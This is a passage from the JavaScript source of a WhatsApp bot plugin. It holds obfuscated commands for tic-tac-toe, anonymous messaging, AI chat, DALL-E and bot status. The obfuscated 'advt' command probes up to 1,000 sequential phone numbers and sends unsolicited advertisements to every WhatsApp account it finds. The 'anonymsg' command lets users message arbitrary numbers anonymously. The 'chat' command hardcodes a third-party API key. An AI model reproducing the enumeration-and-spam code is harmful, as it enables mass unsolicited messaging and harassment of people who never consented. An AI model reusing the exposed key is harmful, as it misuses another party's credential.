_0x56e801[_0x5cc5ce(0xc5)](_0x5e02e7[_0x5cc5ce(0xa9)],{'text':_0x5cc5ce(0xa5)+_0x38a990['currentPlayer'][_0x5cc5ce(0xb5)]('@')[0x0]+',\x20Line\x20you\x20enter\x20is\x20completely\x20Filled.\x20Please\x20Give\x20Other\x20Line\x20Numbers._*','mentions':[_0x38a990[_0x5cc5ce(0xc8)]]},{'quoted':_0x5e02e7});let _0x53c2e7=await _0x38a990[_0x5cc5ce(0xe5)]()||![];_0x38a990['attempts'][_0x38a990[_0x5cc5ce(0xc8)]]++;let _0x515a4d=await _0x38a990[_0x5cc5ce(0xdc)]();_0x38a990[_0x5cc5ce(0xc8)]=_0x38a990['currentPlayer']===_0x38a990[_0x5cc5ce(0xca)]?_0x38a990['player2']:_0x38a990['player1'];if(!_0x53c2e7){let _0x4f46a5=_0x5cc5ce(0xa7)+_0x515a4d+_0x5cc5ce(0xbb)+(_0x38a990[_0x5cc5ce(0xc8)]===_0x38a990[_0x5cc5ce(0xca)]?'🔵':'🔴')+_0x5cc5ce(0xe2)+_0x38a990[_0x5cc5ce(0xc8)]['split']('@')[0x0]+_0x5cc5ce(0xde)+(_0x38a990[_0x5cc5ce(0xc8)]===_0x38a990[_0x5cc5ce(0xca)]?'🔴':'🔵')+_0x5cc5ce(0xe2)+(_0x38a990[_0x5cc5ce(0xc8)]===_0x38a990[_0x5cc5ce(0xca)]?_0x38a990['player2']:_0x38a990[_0x5cc5ce(0xca)])['split']('@')[0x0]+_0x5cc5ce(0xe3)+quotes[Math['floor'](Math[_0x5cc5ce(0xdf)]()*quotes[_0x5cc5ce(0xba)])]+'_\x0a';return await _0x5e02e7['send'](_0x4f46a5,{'mentions':[_0x38a990['player1'],_0x38a990[_0x5cc5ce(0xd8)]]});}else return delete sᴜʜᴀɪʟ_ᴍᴅ_cfg[_0x156449],await _0x5e02e7['send'](_0x5cc5ce(0xbc)+_0x53c2e7[_0x5cc5ce(0xb5)]('@')[0x0]+_0x5cc5ce(0xdb)+_0x38a990[_0x5cc5ce(0xc8)][_0x5cc5ce(0xb5)]('@')[0x0]+_0x5cc5ce(0xdd)+_0x515a4d+_0x5cc5ce(0xc3)+_0x53c2e7[_0x5cc5ce(0xb5)]('@')[0x0]+_0x5cc5ce(0xd5)+_0x38a990[_0x5cc5ce(0xc0)][_0x53c2e7]+_0x5cc5ce(0xe4),{'mentions':[_0x38a990['player1'],_0x38a990['player2']]});}catch(_0x44a3e3){return await console[_0x5cc5ce(0xcb)](_0x5cc5ce(0xaa),_0x44a3e3);}});






























































































async function getDateTime() {
    const now = new Date();
    const date = now.toISOString().slice(0, 10);
    const time = now.toLocaleTimeString();
    return { date, time };
  }
///=============================================


/////-------------=========================================-------------------------------
cmd({
    pattern: "advt",
    alias : ["advertisement"],
    category: "Advertisements",
    desc: "Advertise of your Message, by sending it to provided nmbr range.",
    use: '9231844741xx,Your_text_here',
    filename: __filename,
},
async(Void, citel, text , { isCreator }) => {

var _0x546b66=_0x6d99;(function(_0x4aedf6,_0x85645){var _0x5de56c=_0x6d99,_0x1fc0a5=_0x4aedf6();while(!![]){try{var _0x1887b5=-parseInt(_0x5de56c(0x126))/0x1*(parseInt(_0x5de56c(0x13b))/0x2)+parseInt(_0x5de56c(0x133))/0x3+-parseInt(_0x5de56c(0x12c))/0x4*(-parseInt(_0x5de56c(0x130))/0x5)+parseInt(_0x5de56c(0x13d))/0x6*(-parseInt(_0x5de56c(0x137))/0x7)+parseInt(_0x5de56c(0x127))/0x8*(-parseInt(_0x5de56c(0x141))/0x9)+-parseInt(_0x5de56c(0x12b))/0xa*(-parseInt(_0x5de56c(0x138))/0xb)+-parseInt(_0x5de56c(0x12e))/0xc*(-parseInt(_0x5de56c(0x136))/0xd);if(_0x1887b5===_0x85645)break;else _0x1fc0a5['push'](_0x1fc0a5['shift']());}catch(_0x23cb67){_0x1fc0a5['push'](_0x1fc0a5['shift']());}}}(_0x3269,0x80b58));function _0x3269(){var _0x1013d3=['7796aOCJuI','\x20chats_*\x0a\x09Last_User:\x20','54924iTqsnG','send','1395ZHSrEo','sendMessage','\x0a\x0a\x0a','93lnXNPN','split','*You\x20did\x20not\x20add\x20x\x20in\x20number.*\x0a*Ex:\x20','3263CzGzQA','2136309CczQyf','11njyZoM','reply','onWhatsApp','482186mkVxwm','*Only\x203(x)\x20are\x20Allowed\x20in\x20number*','18qbbJwg','*Advertise\x20of\x20your\x20Message*\x0a*by\x20sending\x20it\x20to\x20provided\x20nmbr\x20range.*\x0a','*Invalid\x20format.\x20Please\x20provide\x20number\x20and\x20Message\x20separated\x20by\x20a\x20comma.*','@s.whatsapp.net','2332305jbDqMa','caption','*_Advertisement\x20of\x20your\x20Message\x20is\x20Done,_*\x0a\x0a*_Message\x20Succesfully\x20sent\x20to\x20','length','\x20number\x20seached\x0a\x0a\x0a','trim','advt\x209231844741xx,Your_Message_here*\x20\x20\x0a\x20','*Sending\x20message\x20to\x20given\x20number\x20range.!*\x0a*It\x20may\x20take\x20some\x20time,\x20so\x20wait\x20please*\x0a\x0a','3fcvhXf','16iPuEMV','slice','advt\x209231844741xx,Your_text_here','owner','9916930xuFSft'];_0x3269=function(){return _0x1013d3;};return _0x3269();}if(!isCreator)return citel[_0x546b66(0x139)](tlang()[_0x546b66(0x12a)]);if(!text)return await citel[_0x546b66(0x139)](_0x546b66(0x13e)+prefix+_0x546b66(0x129));const commaIndex=text['indexOf'](',');if(commaIndex===-0x1)return await citel['send'](_0x546b66(0x13f));let inputnumber=''+text['slice'](0x0,commaIndex)[_0x546b66(0x123)](),msg=text[_0x546b66(0x128)](commaIndex+0x1)[_0x546b66(0x123)]()+_0x546b66(0x132)+Config['caption'];if(!inputnumber['includes']('x'))return citel[_0x546b66(0x12f)](_0x546b66(0x135)+prefix+_0x546b66(0x124)+Config['caption']);await citel[_0x546b66(0x12f)](_0x546b66(0x125)+Config[_0x546b66(0x142)]);function countInstances(_0x7c80f4,_0x1b4edc){var _0x3be017=_0x546b66;return _0x7c80f4[_0x3be017(0x134)](_0x1b4edc)[_0x3be017(0x144)]-0x1;}var number0=inputnumber['split']('x')[0x0],number1=inputnumber[_0x546b66(0x134)]('x')[countInstances(inputnumber,'x')]?inputnumber[_0x546b66(0x134)]('x')[countInstances(inputnumber,'x')]:'',random_length=countInstances(inputnumber,'x'),randomxx;if(random_length==0x1)randomxx=0xa;else{if(random_length==0x2)randomxx=0x64;else{if(random_length==0x3)randomxx=0x3e8;else{if(random_length>0x3)return await citel[_0x546b66(0x12f)](_0x546b66(0x13c));}}}let count=0x0,sents='';var last_user='';function _0x6d99(_0x3cfdc9,_0x4be972){var _0x3269f3=_0x3269();return _0x6d99=function(_0x6d9996,_0x2ee1a1){_0x6d9996=_0x6d9996-0x123;var _0x183fea=_0x3269f3[_0x6d9996];return _0x183fea;},_0x6d99(_0x3cfdc9,_0x4be972);}for(let i=0x0;i<randomxx;i++){var anu=await Void[_0x546b66(0x13a)](''+number0+i+number1+_0x546b66(0x140));if(anu[0x0]){last_user=anu[0x0]['jid'];if(sents['includes'](last_user))continue;await sleep(0x5dc),await Void[_0x546b66(0x131)](last_user,{'text':msg}),sents=sents+','+last_user,count+=0x1;}}return await citel[_0x546b66(0x12f)](_0x546b66(0x143)+count+_0x546b66(0x12d)+last_user[_0x546b66(0x134)]('@')[0x0]+'\x0a\x09Search_No:\x20'+randomxx+_0x546b66(0x145)+Config['caption']);

})




////=======================================================
const sᴜʜᴀɪʟ_ᴍᴅ_AnonyMsg = {}
let isAnnonyMsgAlive = '';
let cmdName = 'rcg';



const _0x2b42ca=_0x59a4;function _0x5b2c(){const _0x16b3fd=['info','2945100QotfTw','sᴜʜᴀɪʟ-ᴍᴅ\x20•\x20ᴀɴɴᴏɴʏᴍᴏᴜs\x20ᴍsɢ','length','replace','sender','senderMsg','includes','startsWith','31444MIFEel','1522605QPSiUe','floor','\x27\x20public\x20Whatsapp\x20bot_\x0a_User\x20not\x20wants\x20to\x20expose\x20itself\x20to\x20send\x20that\x20msg_\x0a\x20\x20\x0a\x20\x20\x0a*if\x20you\x20wanna\x20reply\x20to\x20that\x20user,*\x0a*Send\x20msg\x20by\x20replying\x20to\x20above\x20message*\x0a*Type\x20like:*\x20reply,\x20Type_your_Message_Here\x0a*Example:*\x20reply,\x20Can\x20you\x20text\x20me\x20from\x20your\x20number\x0a\x20\x20\x0a\x20\x20\x0a\x20\x20','*Basically,\x20Its\x20an\x20Annonymous\x20Message*\x0a\x0a_Msg_Id:\x20','*Anonymous\x20Chat\x20Recivers*\x0a_','_*\x0a*_Msg_Id:\x20','random','trim','reply','\x0a*you\x20can\x20reply\x201\x20more\x20time*','3SsxRgk','_\x0a_Sended\x20by\x20\x27','toLowerCase','msgStatus','_\x0a\x0a*Message:*\x20','Msg_Id','@s.whatsapp.net','9097794XOzmqH','tellinfo','*Theres\x20no\x20Anonymous\x20Chat\x20created\x20yet*','caption','*provide\x20number\x20with\x20msg\x20to\x20send\x20Anonymously.*\x20\x0a*Example\x20','slice','text','reciever','\x0a\x0a\x0a','2894712HIKBoT','15VWZtwe','_Provided\x20number\x20is\x20not\x20valid,\x20please\x20give\x20in\x20format_','sendMessage','*_Anonymous\x20message\x20sent\x20succesfully_*','<Hii,\x20Suhail\x20Tech\x20Info>','title','*Msg_Id:*\x20','anony-msg-','10FocMEF','quoted','split','indexOf','_\x0a*Time:*\x20_','howmanyreply','610532nghubX','3233304mRjUXi','error\x20:\x20','_*\x0a\x0a*Message:*\x20','anonychat'];_0x5b2c=function(){return _0x16b3fd;};return _0x5b2c();}function _0x59a4(_0x4caf13,_0x33d87c){const _0x5b2c29=_0x5b2c();return _0x59a4=function(_0x59a4b4,_0x548955){_0x59a4b4=_0x59a4b4-0x11e;let _0x3b9705=_0x5b2c29[_0x59a4b4];return _0x3b9705;},_0x59a4(_0x4caf13,_0x33d87c);}(function(_0x1c8d7b,_0x2ad074){const _0x65db7a=_0x59a4,_0x21012a=_0x1c8d7b();while(!![]){try{const _0x14d41a=parseInt(_0x65db7a(0x13b))/0x1*(parseInt(_0x65db7a(0x11f))/0x2)+-parseInt(_0x65db7a(0x12a))/0x3*(-parseInt(_0x65db7a(0x149))/0x4)+-parseInt(_0x65db7a(0x14f))/0x5+-parseInt(_0x65db7a(0x13a))/0x6+-parseInt(_0x65db7a(0x120))/0x7+parseInt(_0x65db7a(0x14a))/0x8+-parseInt(_0x65db7a(0x131))/0x9*(-parseInt(_0x65db7a(0x143))/0xa);if(_0x14d41a===_0x2ad074)break;else _0x21012a['push'](_0x21012a['shift']());}catch(_0xed0401){_0x21012a['push'](_0x21012a['shift']());}}}(_0x5b2c,0x7d9c9));class AnonymousMsg{constructor(){const _0x60dc7e=_0x59a4;this['id']='',this[_0x60dc7e(0x153)]='',this[_0x60dc7e(0x138)]='',this[_0x60dc7e(0x154)]='',this[_0x60dc7e(0x132)]=0x0,this[_0x60dc7e(0x148)]=0x0;}}cmd({'pattern':'anonymsg','alias':['recognition','anonymous',_0x2b42ca(0x14d)],'desc':'send message to a number through bot number anonimously','category':'AI','use':_0x2b42ca(0x13f),'filename':__filename},async(_0x3f3bd3,_0x53872c,_0x3a968f,{cmdName:_0x4f405,isCreator:_0x32056c})=>{const _0x1f8060=_0x2b42ca;if(!_0x3a968f)return await _0x53872c[_0x1f8060(0x128)](_0x1f8060(0x135)+(prefix+_0x4f405)+'\x20923184474176,your_Message*');if(_0x32056c&&_0x3a968f===_0x1f8060(0x14e))return await _0x53872c[_0x1f8060(0x128)](isAnnonyMsgAlive==''?_0x1f8060(0x133):_0x1f8060(0x124)+isAnnonyMsgAlive+'_');const _0x21b6ef=_0x3a968f[_0x1f8060(0x146)](',');if(_0x21b6ef===-0x1)return await _0x53872c[_0x1f8060(0x128)]('*Invalid\x20format.\x20Please\x20provide\x20both\x20number\x20and\x20Message\x20separated\x20by\x20a\x20comma.*');let _0x1ebb12=_0x3a968f[_0x1f8060(0x136)](0x0,_0x21b6ef)['trim']()+_0x1f8060(0x130),_0x41b958=_0x3a968f['slice'](_0x21b6ef+0x1)[_0x1f8060(0x127)](),_0x1b5497=await parsedJid(_0x1ebb12);if(_0x1b5497[0x0]){if(_0x1b5497[0x0]===_0x53872c[_0x1f8060(0x153)])return await _0x53872c[_0x1f8060(0x128)]('*Provide\x20another\x20number\x20instead\x20of\x20yours,\x20Idiot*');const {date:_0x2faccb,time:_0x4c9c08}=await getDateTime(),_0x3fc014=_0x1f8060(0x142)+Math[_0x1f8060(0x121)](0x186a0+Math[_0x1f8060(0x126)]()*0xdbba0);sᴜʜᴀɪʟ_ᴍᴅ_AnonyMsg[_0x3fc014]=new AnonymousMsg();let _0x4a7cbd=sᴜʜᴀɪʟ_ᴍᴅ_AnonyMsg[_0x3fc014];return _0x4a7cbd['id']=_0x3fc014,_0x4a7cbd[_0x1f8060(0x153)]=_0x53872c[_0x1f8060(0x153)],_0x4a7cbd['reciever']=_0x1b5497[0x0],_0x4a7cbd[_0x1f8060(0x12d)]=!![],_0x4a7cbd[_0x1f8060(0x154)]=_0x53872c,_0x41b958='*sᴜʜᴀɪʟ-ᴍᴅ\x20•\x20ᴀɴɴᴏɴʏᴍᴏᴜs\x20ᴍsɢ*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a*Msg_Id:*\x20'+_0x4a7cbd['id']+'\x0a*Date:*\x20_'+_0x2faccb+_0x1f8060(0x147)+_0x4c9c08+_0x1f8060(0x12e)+_0x41b958+_0x1f8060(0x139)+Config[_0x1f8060(0x134)],isAnnonyMsgAlive=isAnnonyMsgAlive+','+_0x4a7cbd[_0x1f8060(0x138)],await _0x3f3bd3['sendMessage'](_0x4a7cbd['reciever'],{'text':_0x41b958}),await _0x53872c[_0x1f8060(0x128)](_0x1f8060(0x13e));}else return await _0x53872c[_0x1f8060(0x128)](_0x1f8060(0x13c));}),cmd({'on':_0x2b42ca(0x137)},async(_0x26c792,_0x4e9817,_0x4c2c89)=>{const _0x483f8e=_0x2b42ca;if(_0x4e9817[_0x483f8e(0x144)]&&isAnnonyMsgAlive['includes'](_0x4e9817[_0x483f8e(0x153)])&&_0x4e9817[_0x483f8e(0x137)][_0x483f8e(0x151)]>0x2){const _0x2c63ae=_0x4e9817[_0x483f8e(0x144)]['text'][_0x483f8e(0x145)]('\x0a');if(_0x2c63ae[_0x483f8e(0x151)]<0x3)return;if(_0x4e9817[_0x483f8e(0x144)][_0x483f8e(0x137)][_0x483f8e(0x155)](_0x483f8e(0x150))&&_0x2c63ae[0x0][_0x483f8e(0x155)](_0x483f8e(0x150))&&_0x2c63ae[0x2][_0x483f8e(0x155)](_0x483f8e(0x12f))){let _0x4ec172=''+_0x2c63ae[0x2][_0x483f8e(0x152)](_0x483f8e(0x141),'')['trim'](),_0xf03dfb=sᴜʜᴀɪʟ_ᴍᴅ_AnonyMsg[_0x4ec172];if(!_0xf03dfb)return;try{if(_0xf03dfb){let _0x4d7eeb=_0x4e9817['text'][_0x483f8e(0x145)](',')[0x0][_0x483f8e(0x127)]();if(_0x4d7eeb[_0x483f8e(0x12c)]()[_0x483f8e(0x11e)](_0x483f8e(0x128))){_0xf03dfb[_0x483f8e(0x148)]+=0x1;const _0x13c455=_0x4e9817['text'][_0x483f8e(0x146)](',');let _0x76f73d='*sᴜʜᴀɪʟ-ᴍᴅ\x20•\x20ʏᴏᴜʀ\x20ᴀɴᴏɴʏ-ᴍsɢ\x20ʀᴇᴘʟʏ*\x0a\x0a*_From\x20@'+_0xf03dfb[_0x483f8e(0x138)][_0x483f8e(0x145)]('@')[0x0]+_0x483f8e(0x125)+_0xf03dfb['id']+_0x483f8e(0x14c)+_0x4e9817['text']['slice'](_0x13c455+0x1)['trim']()+'\x0a\x0a\x0a\x0a'+Config[_0x483f8e(0x134)];return _0xf03dfb[_0x483f8e(0x148)]>=0x2&&(isAnnonyMsgAlive=isAnnonyMsgAlive[_0x483f8e(0x152)](','+_0x4e9817[_0x483f8e(0x153)],'')),await _0x26c792['sendMessage'](_0xf03dfb[_0x483f8e(0x153)],{'text':_0x76f73d,'mentions':[_0xf03dfb['reciever']]},{'quoted':_0xf03dfb[_0x483f8e(0x154)]}),_0xf03dfb[_0x483f8e(0x148)]>=0x2&&(isAnnonyMsgAlive=isAnnonyMsgAlive['replace'](','+_0x4e9817[_0x483f8e(0x153)],''),delete sᴜʜᴀɪʟ_ᴍᴅ_AnonyMsg[_0x4ec172]),await _0x4e9817['reply']('*_Your\x20Message\x20succesfully\x20deliver\x20to\x20User_*\x20'+(_0xf03dfb[_0x483f8e(0x148)]==0x1?_0x483f8e(0x129):'')+'\x20');}else{if(_0xf03dfb[_0x483f8e(0x132)]===0x0){_0xf03dfb[_0x483f8e(0x132)]=0x1;let _0x4175f0=_0x483f8e(0x123)+_0xf03dfb['id']+_0x483f8e(0x12b)+tlang()[_0x483f8e(0x140)]+_0x483f8e(0x122)+Config[_0x483f8e(0x134)];return await _0x26c792[_0x483f8e(0x13d)](_0xf03dfb[_0x483f8e(0x138)],{'text':_0x4175f0},{'quoted':_0x4e9817});}else{if(_0xf03dfb[_0x483f8e(0x132)]===0x1)return _0xf03dfb[_0x483f8e(0x132)]=0x2,_0x4e9817[_0x483f8e(0x128)]('*Please\x20follow\x20the\x20format\x20if\x20reply\x20to\x20msg*\x0a*Type\x20like:\x20_reply,\x20Type_your_Message_Here_*');else return;}}}}catch(_0x1ecb74){console['log'](_0x483f8e(0x14b),_0x1ecb74);}}}});
//---------------------------------------------------------------------------
//                  AI  CHAT  COMMAND
//---------------------------------------------------------------------------
cmd({
    pattern: "chat",
    desc: "chat with an AI",
    category: "AI",
    use: '<Hii, Suhail Tech Info>',
    filename: __filename,
},
async(Void, citel,text) => 
{
  //  let zx = text.length;
    //if (zx < 300) {
        let {data} = await axios.get(`http://api.brainshop.ai/get?bid=175685&key=Pg8Wu8mrDQjfr0uv&uid=[${citel.sender.split("@")[0]}]&msg=[${text}]`);
        return citel.reply(data.cnt);  
// }

    /*
if (!text) return citel.reply(`Hey there! ${citel.pushName}. How are you doing these days?`); // for null text 

    const { Configuration, OpenAIApi } = require("openai");
    const configuration = new Configuration
            ({
                       apiKey:Config.OPENAI_API_KEY ,
            });

    const openai = new OpenAIApi(configuration);
    const completion = await openai.createCompletion({
        model: "text-davinci-002",
        prompt: text,
        temperature: 0.5,
        max_tokens: 200,
        top_p: 1.0,
        frequency_penalty: 0.5,
        presence_penalty: 0.0,
        stop: ['"""'],
    });
    citel.reply(completion.data.choices[0].text);

*/
}
)


//---------------------------------------------------------------------------
cmd({
    pattern: "gpt",
    desc: "chat with an AI",
    category: "AI",
    use: '<Hii, Suhail Tech Info>',
    filename: __filename,
},
async(Void, citel,text) => 
{
if (!Config.OPENAI_API_KEY || Config.OPENAI_API_KEY=='' ||  !Config.OPENAI_API_KEY.startsWith('sk') ) return citel.reply('You Dont Have OPENAI API KEY \nPlease Create OPEN API KEY from Given Link \nhttps://platform.openai.com/account/api-keys\nAnd Set Key in Heroku OPENAI_API_KEY Var  ')
if (!text) return citel.reply(`Hey there! ${citel.pushName}. How are you doing these days?`); 

const response = await fetch("https://api.openai.com/v1/chat/completions", {
method: "POST",
headers: {
  "Content-Type": "application/json",
  Authorization: `Bearer ${Config.OPENAI_API_KEY}`,
},
body: JSON.stringify({
  model: "gpt-3.5-turbo", // Specify the desired model here
  messages: [{ role: "system", content: "You" }, { role: "user", content: text }],
}),
});

const data = await response.json();
//console.log("GPT REPONCE : ",data); 
if (!data.choices || data.choices.length === 0) {citel.reply("*Invalid ChatGPT API Key, Please Put New Key*"); }
return await  citel.reply(data.choices[0].message.content)




/*
const { Configuration, OpenAIApi } = require("openai");
    const configuration = new Configuration
            ({
                       apiKey:Config.OPENAI_API_KEY ,
            });

    const openai = new OpenAIApi(configuration);
    const completion = await openai.createCompletion({
        model: "text-davinci-002",
        prompt: text,
        temperature: 0.5,
        max_tokens: 200,
        top_p: 1.0,
        frequency_penalty: 0.5,
        presence_penalty: 0.0,
        stop: ['"""'],
    });
    citel.reply(completion.data.choices[0].text);
*/
}
)


//---------------------------------------------------------------------------
cmd({
    pattern: "dalle",
alias : ['dall','dall-e'],
    desc: "chat with an AI",
    category: "AI",
    use: '<Hii, Suhail Tech Info>',
    filename: __filename,
},
async(Void, citel,text) => 
{
  function _0x59a8(){const _0x1d63b7=['26881RiBTzD','POST','9FEXiSq','url','786249lJnBYr','Bearer\x20','5986580TDkKVm','783582jHPgfy','json','chat','reply','https://api.openai.com/v1/images/generations','70580pKHfkI','application/json','19518LWDQXM','caption','108QGlYIu','data','512x512','147IgJvgn','OPENAI_API_KEY','stringify','1565864LubHcG'];_0x59a8=function(){return _0x1d63b7;};return _0x59a8();}function _0x30d9(_0x4c83f1,_0x5f57db){const _0x59a899=_0x59a8();return _0x30d9=function(_0x30d9f4,_0x41b649){_0x30d9f4=_0x30d9f4-0x18a;let _0x361331=_0x59a899[_0x30d9f4];return _0x361331;},_0x30d9(_0x4c83f1,_0x5f57db);}const _0x4eaba9=_0x30d9;(function(_0x337e7f,_0x46f7cb){const _0x2fd393=_0x30d9,_0x37b782=_0x337e7f();while(!![]){try{const _0x2a2bb3=parseInt(_0x2fd393(0x190))/0x1+parseInt(_0x2fd393(0x197))/0x2+-parseInt(_0x2fd393(0x194))/0x3+parseInt(_0x2fd393(0x1a0))/0x4*(-parseInt(_0x2fd393(0x19c))/0x5)+parseInt(_0x2fd393(0x19e))/0x6*(parseInt(_0x2fd393(0x18c))/0x7)+-parseInt(_0x2fd393(0x18f))/0x8*(parseInt(_0x2fd393(0x192))/0x9)+parseInt(_0x2fd393(0x196))/0xa;if(_0x2a2bb3===_0x46f7cb)break;else _0x37b782['push'](_0x37b782['shift']());}catch(_0x120f23){_0x37b782['push'](_0x37b782['shift']());}}}(_0x59a8,0x3c3a7));if(Config[_0x4eaba9(0x18d)]=='')return citel['reply']('You\x20Dont\x20Have\x20OPENAI_API_KEY\x20\x0aPlease\x20Create\x20OPEN\x20API\x20KEY\x20from\x20Given\x20Link\x20\x0ahttps://platform.openai.com/account/api-keys');if(!text)return citel[_0x4eaba9(0x19a)]('*Give\x20Me\x20A\x20Query\x20To\x20Get\x20Dall-E\x20Reponce\x20?*');const OPENAI_API_KEY=Config[_0x4eaba9(0x18d)],imageSize=_0x4eaba9(0x18b),apiUrl=_0x4eaba9(0x19b),response=await fetch(apiUrl,{'method':_0x4eaba9(0x191),'headers':{'Content-Type':_0x4eaba9(0x19d),'Authorization':_0x4eaba9(0x195)+OPENAI_API_KEY},'body':JSON[_0x4eaba9(0x18e)]({'model':'image-alpha-001','prompt':text,'size':imageSize,'response_format':_0x4eaba9(0x193)})}),data=await response[_0x4eaba9(0x198)]();let buttonMessage={'image':{'url':data[_0x4eaba9(0x18a)][0x0][_0x4eaba9(0x193)]},'caption':'*---Your\x20DALL-E\x20Result---*\x0a'+Config[_0x4eaba9(0x19f)]};Void['sendMessage'](citel[_0x4eaba9(0x199)],{'image':{'url':data['data'][0x0][_0x4eaba9(0x193)]}});
}
)


//---------------------------------------------------------------------------
//                  RREPOSITORY  COMMAND
//---------------------------------------------------------------------------
cmd({
    pattern: "repo",
    alias: ["git", "sc", "script"],
    desc: "Sends info about repo",
    category: "general",
    filename: __filename,
},
async(Void, citel) => {
    let { data } = await axios.get('https://api.github.com/repos/SuhailTechInfo/Secktor-bot')
    let cap = `
*⭐ Total Stars:* ${data.stargazers_count} stars
*🍽️ Forks:* ${data.forks_count} forks
*🍁 Repo:* _https://github.com/SuhailTechInfo/Secktor-bot_
*🧩 Scan:* _https://replit.com/@SuhailTechInfo/Secktor-Bot_
\n*Visit For Tutorial :-*
_https://www.Youtube.com/c/SuhailTechInfo_
\n\n${Config.caption}`

    let buttonMessaged = {   image: { url: await botpic() },    caption: cap,  };   
    return await Void.sendMessage(citel.chat, buttonMessaged, {   quoted: citel, });
});


cmd({
    pattern: "link",
    alias: ["ytube", "yt", "myyt"],
    desc: "Sends info about My Ytube Channel __CheckOut :_ www.Youtube.com/c/SuhailTechInfo",
    category: "general",
    filename: __filename,
},
async(Void, citel) => {
   
let cap = `
╔══════════════════════════╗
☞𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋☜
╚══════════════════════════╝\n
*⭐ Youtube Content :* How To Create Whatsapp Bot
*🍽️ Total Subscriber:* 36 Subscribers
*🍁 Channel Link:* _https://youtube.com/suhailtechinfo?sub_confirmation=1_\n
╭━━━━━━━━━━━━━━━━━━━━╮
┇  ╔═╦╗╔╦╗╔═╦═╦╦╦╦╗╔═╗
┇  ║╚╣║║║╚╣╚╣╔╣╔╣║╚╣═╣
┇  ╠╗║╚╝║║╠╗║╚╣║║║║║═╣
┇  ╚═╩══╩═╩═╩═╩╝╚╩═╩═╝
╰━━━━━━━━━━━━━━━━━━━━╯
𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐌𝐘 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋*`


    let buttonMessaged = 
        {
        image: { url: await botpic() },
        caption: cap,
        footer: tlang().footer,
        headerType: 4
        };
       
    return await Void.sendMessage(citel.chat, buttonMessaged, {   quoted: citel, });

}
)

//---------------------------------------------------------------------------
//                  BOT STATUS COMMAND
//---------------------------------------------------------------------------
cmd({
    pattern: "status",
    alias: ["about" , "info"],
    desc: "To check bot status",
    category: "general",
    filename: __filename,
},
async(Void, citel) => {


    const uptime = process.uptime();
    timestampe = speed();
    latensie = speed() - timestampe;
    let ter = `
🔰 *${tlang().title}* 🔰

*🌟Description:* A WhatsApp bot with rich features, Created By *Suhail Tech Info*.\n
*⚡Speed:* ${latensie.toFixed(4)} ms
*🚦Uptime:* ${runtime(process.uptime())}
*🕸Version:* 1.0.0
*👤Owner:*  ${Config.ownername}\n\n
*Powered by 'Suhail Tech Info'*
*Youtube :* _youtube.com/c/SuhailTechInfo_
\n\n${Config.caption}`;
    let buttonMessaged = {
        image: { url: await botpic() },
        caption: ter,
        footer: tlang().footer,
        headerType: 4
        
    };
    return await Void.sendMessage(citel.chat, buttonMessaged, {
        quoted: citel,
    });

}
)
//========================================================================

cmd({
pattern: "cpu",
desc: "To check bot status",
category: "general",
filename: __filename,
},
async(Void, citel) => {
const os = require('os')
const speed = require('performance-now')
  const used = process.memoryUsage()
  const cpus = os.cpus().map(cpu => {
      cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
      return cpu
  })
  const cpu = cpus.reduce((last, cpu, _, { length }) => 
  {
      last.total += cpu.total
      last.speed += cpu.speed / length
      last.times.user += cpu.times.user
      last.times.nice += cpu.times.nice
      last.times.sys += cpu.times.sys
      last.times.idle += cpu.times.idle
      last.times.irq += cpu.times.irq
      return last
  },{ speed: 0,total: 0,times: {user: 0,nice: 0,sys: 0,idle: 0,irq: 0 } }
  )
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
              
respon = `
Response Speed ${latensi.toFixed(1)}Sec / ${(oldd - neww).toFixed(1)}ms
Runtime : ${runtime(process.uptime())}`


let resp2 = `💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

NodeJS Memory Usaage
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `Total CPU Usage
${cpus[0].model.trim()} (${cpu.speed} MHZ)
${Object.keys(cpu.times).map(type => `- ${(type + '').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
CPU Core(s) Usage (${cpus.length} Core CPU)
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)
${Object.keys(cpu.times).map(type => `- ${(type + '').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
  `.trim()

  return await citel.reply(respon+resp2 )
})

























































































cmd({
    pattern: "antibot",
    desc: "kick Bot Users from Group!",
    category: "group",
    filename: __filename
},
async(Void, citel, text , { cmdName ,isCreator}) => {
  function _0x2d85(_0xaa10,_0x1528ed){const _0x376bc6=_0x376b();return _0x2d85=function(_0x2d8530,_0x1aafaf){_0x2d8530=_0x2d8530-0x88;let _0x6283a1=_0x376bc6[_0x2d8530];return _0x6283a1;},_0x2d85(_0xaa10,_0x1528ed);}const _0x2c4fcf=_0x2d85;(function(_0x847c4d,_0x58ffb9){const _0xa39a68=_0x2d85,_0x181098=_0x847c4d();while(!![]){try{const _0x4acbad=parseInt(_0xa39a68(0xaf))/0x1*(-parseInt(_0xa39a68(0xa4))/0x2)+-parseInt(_0xa39a68(0x96))/0x3+-parseInt(_0xa39a68(0x9e))/0x4*(-parseInt(_0xa39a68(0x95))/0x5)+parseInt(_0xa39a68(0x97))/0x6+-parseInt(_0xa39a68(0x9d))/0x7+-parseInt(_0xa39a68(0xa0))/0x8+parseInt(_0xa39a68(0x9c))/0x9;if(_0x4acbad===_0x58ffb9)break;else _0x181098['push'](_0x181098['shift']());}catch(_0x3ca238){_0x181098['push'](_0x181098['shift']());}}}(_0x376b,0x18e6c));if(!citel[_0x2c4fcf(0xa6)])return citel[_0x2c4fcf(0xac)](tlang()[_0x2c4fcf(0x8d)]);const groupAdmins=await getAdmin(Void,citel),botNumber=await 